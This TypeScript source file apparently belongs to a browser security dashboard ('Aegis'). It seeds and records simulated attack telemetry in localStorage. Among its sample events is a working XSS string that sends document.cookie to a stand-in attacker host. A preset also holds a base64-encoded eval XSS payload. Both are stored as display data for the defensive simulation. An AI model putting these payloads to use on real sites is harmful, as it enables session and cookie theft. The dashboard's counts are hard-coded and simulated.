import { AttackVectorTelemetry, RealtimeTrendPoint, LiveAttackEvent } from '../types';
import { recordLiveThreatBlocked } from './threatHeatmapService';
import { incrementThreatBlocked } from './authStorage';

const STORAGE_KEY_TRENDS = 'aegis_realtime_trends_telemetry';
const STORAGE_KEY_VECTORS = 'aegis_attack_vectors_telemetry';
const STORAGE_KEY_EVENTS = 'aegis_live_attack_events_log';
export const EVENT_ANALYTICS_UPDATE = 'aegis-security-analytics-update';

// Baseline vector configuration
export const ATTACK_VECTOR_DEFINITIONS: Omit<AttackVectorTelemetry, 'count' | 'percentage' | 'activeRatePerMin'>[] = [
  {
    key: 'phishing',
    name: 'Phishing & Credential Harvesters',
    severity: 'critical',
    color: '#f43f5e', // rose-500
    gradient: ['#f43f5e', '#fb7185'],
    aegisSubsystem: 'Heuristic Brand & Homograph Classifier',
    description: 'Deceptive credential harvesting portals, punycode spoofing, and forged OAuth/banking landing pages.',
    mitigationMethod: 'Virtual Sandbox Isolation & Route Nullification',
  },
  {
    key: 'xss',
    name: 'DOM & URL Script Injections (XSS)',
    severity: 'critical',
    color: '#f59e0b', // amber-500
    gradient: ['#f59e0b', '#fbbf24'],
    aegisSubsystem: 'Aegis Dynamic DOM Lexer & CSP Shield',
    description: 'Reflective and stored JavaScript payload vectors, eval() evasion, and cookie exfiltration probers.',
    mitigationMethod: 'AST Token Stripping & Strict Execution Disarm',
  },
  {
    key: 'malware',
    name: 'Cryptominers & Malicious Payloads',
    severity: 'high',
    color: '#a855f7', // purple-500
    gradient: ['#a855f7', '#c084fc'],
    aegisSubsystem: 'WASM & CPU Throttle Heuristic Guard',
    description: 'Hidden browser WebWorker miners (Monero/CoinHive), malicious blob downloads, and payload droppers.',
    mitigationMethod: 'Process Isolation & Cryptographic Thread Lock',
  },
  {
    key: 'tracker',
    name: 'Invasive Trackers & Fingerprinters',
    severity: 'medium',
    color: '#06b6d4', // cyan-500
    gradient: ['#06b6d4', '#22d3ee'],
    aegisSubsystem: 'Zero-Entropy Privacy Synthetic Filter',
    description: 'Canvas fingerprinting, WebRTC IP leakage, audio context hardware hashing, and cross-site beacons.',
    mitigationMethod: 'Synthetic Noise Injection & Beacon Severing',
  },
  {
    key: 'insecure_http',
    name: 'Insecure Plaintext HTTP & MitM',
    severity: 'high',
    color: '#ef4444', // red-500
    gradient: ['#ef4444', '#f87171'],
    aegisSubsystem: 'Aegis Strict HSTS Force-Upgrade Tunnel',
    description: 'Unencrypted cleartext traffic subject to ISP packet tampering, Wi-Fi eavesdropping, and SSL stripping.',
    mitigationMethod: 'Automated HTTPS Upgrade & MitM Alert Block',
  },
  {
    key: 'dns_spoof',
    name: 'DNS Spoofing & Typosquatting',
    severity: 'high',
    color: '#10b981', // emerald-500
    gradient: ['#10b981', '#34d399'],
    aegisSubsystem: 'DoH DNSSEC Origin Cryptographic Resolver',
    description: 'Cache poisoning attempts, deceptive consonant-swap domains, and unverified authority signatures.',
    mitigationMethod: 'DNSSEC Cryptographic Chain Enforcement',
  },
];

// Initial seed events
const SEED_EVENTS: LiveAttackEvent[] = [
  {
    id: 'evt-seed-1',
    timestamp: new Date(Date.now() - 45000).toLocaleTimeString(),
    timestampMs: Date.now() - 45000,
    vector: 'phishing',
    severity: 'critical',
    domain: 'secure-appleid-support.live',
    payloadSnippet: '/auth/verify?token=eyJh...&redirect=login',
    mitigation: 'Quarantined in Aegis Virtual Sandbox; DNS route nullified.',
    heuristicRule: 'AEGIS-RULE-PHISH-042 (Typosquat Brand Match)',
    quarantined: true,
    latencyMs: 1.1,
  },
  {
    id: 'evt-seed-2',
    timestamp: new Date(Date.now() - 110000).toLocaleTimeString(),
    timestampMs: Date.now() - 110000,
    vector: 'xss',
    severity: 'critical',
    domain: 'portal.vulnerable-crm.net',
    payloadSnippet: '<svg/onload=fetch("https://attacker.io/steal?"+document.cookie)>',
    mitigation: 'Script execution disarmed; payload stripped by AST Guard.',
    heuristicRule: 'AEGIS-RULE-XSS-109 (DOM SVG/Event Injection)',
    quarantined: true,
    latencyMs: 0.8,
  },
  {
    id: 'evt-seed-3',
    timestamp: new Date(Date.now() - 180000).toLocaleTimeString(),
    timestampMs: Date.now() - 180000,
    vector: 'malware',
    severity: 'high',
    domain: 'free-stream-media-hub.cc',
    payloadSnippet: 'worker.js [Cryptonight WASM Bytecode 4.2MB]',
    mitigation: 'WebWorker spawned process throttled and killed.',
    heuristicRule: 'AEGIS-RULE-CRYPTO-201 (High-Entropy WASM Miner Loop)',
    quarantined: true,
    latencyMs: 1.4,
  },
  {
    id: 'evt-seed-4',
    timestamp: new Date(Date.now() - 260000).toLocaleTimeString(),
    timestampMs: Date.now() - 260000,
    vector: 'tracker',
    severity: 'medium',
    domain: 'ad-track-matrix.analytics-cdn.biz',
    payloadSnippet: 'CanvasRenderingContext2D.getImageData() [Entropy 54.8 bits]',
    mitigation: 'Spoofed with pseudorandom zero-entropy canvas noise.',
    heuristicRule: 'AEGIS-RULE-FP-007 (Audio/Canvas Hardware Profiler)',
    quarantined: false,
    latencyMs: 0.4,
  },
  {
    id: 'evt-seed-5',
    timestamp: new Date(Date.now() - 340000).toLocaleTimeString(),
    timestampMs: Date.now() - 340000,
    vector: 'insecure_http',
    severity: 'high',
    domain: 'legacy-accounting-gateway.org',
    payloadSnippet: 'GET /payroll/login HTTP/1.1 (Unencrypted Plaintext)',
    mitigation: 'Upgraded via Aegis HSTS Tunnel to TLS 1.3.',
    heuristicRule: 'AEGIS-RULE-HSTS-001 (Cleartext Protocol Intercept)',
    quarantined: false,
    latencyMs: 0.6,
  },
  {
    id: 'evt-seed-6',
    timestamp: new Date(Date.now() - 420000).toLocaleTimeString(),
    timestampMs: Date.now() - 420000,
    vector: 'dns_spoof',
    severity: 'high',
    domain: 'paypaI-checkout.com',
    payloadSnippet: 'Homoglyph: Latin small "I" substituted for lowercase "l"',
    mitigation: 'Intercepted before DoH upstream query execution.',
    heuristicRule: 'AEGIS-RULE-DNS-088 (IDN Homograph Substitution)',
    quarantined: true,
    latencyMs: 1.2,
  },
];

// Generate 24 hours of trend points
function generateInitialTrends(): RealtimeTrendPoint[] {
  const points: RealtimeTrendPoint[] = [];
  const now = Date.now();
  const intervalMinutes = 60; // 24 points (1 hour each)
  const totalPoints = 24;

  const baselineCurve = [
    14, 11, 8, 7, 9, 15, 26, 38, 49, 57, 51, 46,
    42, 48, 62, 59, 54, 49, 43, 37, 31, 25, 20, 18
  ];

  for (let i = totalPoints - 1; i >= 0; i--) {
    const timestamp = now - i * intervalMinutes * 60 * 1000;
    const dateObj = new Date(timestamp);
    const hour = dateObj.getHours();
    const ampm = hour >= 12 ? 'PM' : 'AM';
    const displayHour = hour % 12 === 0 ? 12 : hour % 12;
    const timeLabel = `${displayHour}:00 ${ampm}`;

    const curveVal = baselineCurve[23 - i] || 25;
    const phishing = Math.max(1, Math.round(curveVal * 0.30));
    const xss = Math.max(1, Math.round(curveVal * 0.22));
    const malware = Math.max(0, Math.round(curveVal * 0.14));
    const tracker = Math.max(2, Math.round(curveVal * 0.24));
    const insecureHttp = Math.max(0, Math.round(curveVal * 0.06));
    const dnsSpoof = Math.max(0, curveVal - (phishing + xss + malware + tracker + insecureHttp));
    const total = phishing + xss + malware + tracker + insecureHttp + dnsSpoof;

    points.push({
      timestamp,
      timeLabel,
      total,
      phishing,
      xss,
      malware,
      tracker,
      insecureHttp,
      dnsSpoof,
    });
  }

  return points;
}

// Get or initialize trend telemetry
export function getStoredTrends(): RealtimeTrendPoint[] {
  try {
    const raw = localStorage.getItem(STORAGE_KEY_TRENDS);
    if (raw) {
      const parsed = JSON.parse(raw);
      if (Array.isArray(parsed) && parsed.length > 0) {
        return parsed;
      }
    }
  } catch (err) {
    console.warn('Error reading stored trends:', err);
  }
  const initial = generateInitialTrends();
  localStorage.setItem(STORAGE_KEY_TRENDS, JSON.stringify(initial));
  return initial;
}

// Get or calculate attack vectors distribution
export function getStoredAttackVectors(): AttackVectorTelemetry[] {
  try {
    const raw = localStorage.getItem(STORAGE_KEY_VECTORS);
    if (raw) {
      const parsed = JSON.parse(raw);
      if (Array.isArray(parsed) && parsed.length === ATTACK_VECTOR_DEFINITIONS.length) {
        return parsed;
      }
    }
  } catch (err) {
    console.warn('Error reading stored attack vectors:', err);
  }

  // Calculate default counts
  const defaults: Record<string, number> = {
    phishing: 284,
    xss: 198,
    malware: 112,
    tracker: 247,
    insecure_http: 74,
    dns_spoof: 85,
  };

  const total = Object.values(defaults).reduce((a, b) => a + b, 0);

  const vectors: AttackVectorTelemetry[] = ATTACK_VECTOR_DEFINITIONS.map((def) => {
    const count = defaults[def.key] || 50;
    const percentage = Number(((count / total) * 100).toFixed(1));
    const activeRatePerMin = Number((count / (24 * 60)).toFixed(2));
    return {
      ...def,
      count,
      percentage,
      activeRatePerMin,
    };
  });

  localStorage.setItem(STORAGE_KEY_VECTORS, JSON.stringify(vectors));
  return vectors;
}

// Get stored live events
export function getStoredLiveEvents(): LiveAttackEvent[] {
  try {
    const raw = localStorage.getItem(STORAGE_KEY_EVENTS);
    if (raw) {
      const parsed = JSON.parse(raw);
      if (Array.isArray(parsed) && parsed.length > 0) {
        return parsed;
      }
    }
  } catch (err) {
    console.warn('Error reading stored events:', err);
  }
  localStorage.setItem(STORAGE_KEY_EVENTS, JSON.stringify(SEED_EVENTS));
  return SEED_EVENTS;
}

// Record a simulated or live attack event
export function recordAttackEvent(event: Omit<LiveAttackEvent, 'id' | 'timestamp' | 'timestampMs'>): {
  event: LiveAttackEvent;
  vectors: AttackVectorTelemetry[];
  trends: RealtimeTrendPoint[];
} {
  const id = `evt-${Date.now()}-${Math.random().toString(36).substring(2, 6)}`;
  const now = new Date();
  const newEvent: LiveAttackEvent = {
    ...event,
    id,
    timestamp: now.toLocaleTimeString(),
    timestampMs: now.getTime(),
  };

  // 1. Update live events log (keep latest 50)
  const events = [newEvent, ...getStoredLiveEvents()].slice(0, 50);
  localStorage.setItem(STORAGE_KEY_EVENTS, JSON.stringify(events));

  // 2. Update attack vector breakdown
  const vectors = getStoredAttackVectors();
  const targetVector = vectors.find((v) => v.key === event.vector);
  if (targetVector) {
    targetVector.count += 1;
  }
  const newTotal = vectors.reduce((sum, v) => sum + v.count, 0);
  vectors.forEach((v) => {
    v.percentage = Number(((v.count / newTotal) * 100).toFixed(1));
  });
  localStorage.setItem(STORAGE_KEY_VECTORS, JSON.stringify(vectors));

  // 3. Update realtime trends (increment latest point)
  const trends = getStoredTrends();
  if (trends.length > 0) {
    const latest = trends[trends.length - 1];
    latest.total += 1;
    if (event.vector === 'phishing') latest.phishing += 1;
    else if (event.vector === 'xss') latest.xss += 1;
    else if (event.vector === 'malware') latest.malware += 1;
    else if (event.vector === 'tracker') latest.tracker += 1;
    else if (event.vector === 'insecure_http') latest.insecureHttp += 1;
    else if (event.vector === 'dns_spoof') latest.dnsSpoof += 1;
    localStorage.setItem(STORAGE_KEY_TRENDS, JSON.stringify(trends));
  }

  // 4. Sync with threat heatmap service and auth profile stats
  recordLiveThreatBlocked(event.vector);
  incrementThreatBlocked();

  // 5. Dispatch event for reactive listeners
  window.dispatchEvent(new CustomEvent(EVENT_ANALYTICS_UPDATE, { detail: newEvent }));

  return { event: newEvent, vectors, trends };
}

// Reset telemetry data to fresh defaults
export function resetAnalyticsTelemetry(): {
  vectors: AttackVectorTelemetry[];
  trends: RealtimeTrendPoint[];
  events: LiveAttackEvent[];
} {
  localStorage.removeItem(STORAGE_KEY_TRENDS);
  localStorage.removeItem(STORAGE_KEY_VECTORS);
  localStorage.removeItem(STORAGE_KEY_EVENTS);

  const vectors = getStoredAttackVectors();
  const trends = getStoredTrends();
  const events = getStoredLiveEvents();

  window.dispatchEvent(new CustomEvent(EVENT_ANALYTICS_UPDATE));
  return { vectors, trends, events };
}

// Preset Attack Scenarios for the Live Attack Generator
export interface AttackSimulationPreset {
  id: string;
  title: string;
  vector: LiveAttackEvent['vector'];
  severity: LiveAttackEvent['severity'];
  domain: string;
  payload: string;
  mitigation: string;
  heuristicRule: string;
  description: string;
}

export const SIMULATION_PRESETS: AttackSimulationPreset[] = [
  {
    id: 'sim-phish-bank',
    title: 'Phishing Credential Harvester',
    vector: 'phishing',
    severity: 'critical',
    domain: 'chase-security-verify-session.xyz',
    payload: 'POST /api/v1/auth/steal-creds (Form Spoofing)',
    mitigation: 'Intercepted by Aegis Phishing Sandbox; Domain DNSSEC blacklisted.',
    heuristicRule: 'AEGIS-RULE-PHISH-092 (Banking Brand Signature Mimicry)',
    description: 'Simulates a high-grade fake online banking verification landing portal.',
  },
  {
    id: 'sim-xss-dom',
    title: 'DOM Reflection XSS Exploit',
    vector: 'xss',
    severity: 'critical',
    domain: 'app.cloud-analytics-crm.org',
    payload: '<img src=x onerror="new Function(atob(\'ZG9jdW1lbnQubG9jYXRpb24=\'))()">',
    mitigation: 'AST Token stripped by Aegis Dynamic DOM Parser.',
    heuristicRule: 'AEGIS-RULE-XSS-204 (Base64 Eval Function Injection)',
    description: 'Simulates encoded DOM image tag payload attempting memory exfiltration.',
  },
  {
    id: 'sim-crypto-miner',
    title: 'WebWorker Cryptojacking Miner',
    vector: 'malware',
    severity: 'high',
    domain: 'free-games-arcade.cc',
    payload: 'WASM WebWorker (Monero CryptoNight v7 100% CPU thread)',
    mitigation: 'Thread execution disarmed; WebAssembly sandboxing enforced.',
    heuristicRule: 'AEGIS-RULE-CRYPTO-118 (High CPU WASM Thread Spin)',
    description: 'Simulates stealth in-browser cryptocurrency miner draining user CPU.',
  },
  {
    id: 'sim-tracker-probe',
    title: 'Invasive Canvas & Hardware Fingerprinter',
    vector: 'tracker',
    severity: 'medium',
    domain: 'telemetry-ad-mesh.net',
    payload: 'WebGLRenderer + AudioContext.createOscillator() Fingerprint',
    mitigation: 'Synthetic noise injected; zero entropy hardware profile returned.',
    heuristicRule: 'AEGIS-RULE-FP-031 (Hardware Canvas Hashing)',
    description: 'Simulates cross-site tracker fingerprinting hardware characteristics.',
  },
  {
    id: 'sim-http-mitm',
    title: 'Insecure Plaintext HTTP MitM',
    vector: 'insecure_http',
    severity: 'high',
    domain: 'payment-checkout.unencrypted-shop.com',
    payload: 'Plaintext Credit Card Form Transmission over Port 80',
    mitigation: 'Session upgraded to TLS 1.3 via Aegis Strict HSTS Guard.',
    heuristicRule: 'AEGIS-RULE-HSTS-002 (Insecure Financial Transaction)',
    description: 'Simulates e-commerce checkout over unencrypted HTTP protocol.',
  },
  {
    id: 'sim-dns-typo',
    title: 'DNS Typosquatting & Homoglyph',
    vector: 'dns_spoof',
    severity: 'high',
    domain: 'gооgle.com (Cyrillic Small "о" Unicode)',
    payload: 'IDN Spoofing Punycode xn--ggle-p50aa.com',
    mitigation: 'Punycode translated and quarantined before DNS resolution.',
    heuristicRule: 'AEGIS-RULE-DNS-140 (Cyrillic Homoglyph Confusion)',
    description: 'Simulates internationalized domain name spoofing top global websites.',
  },
];
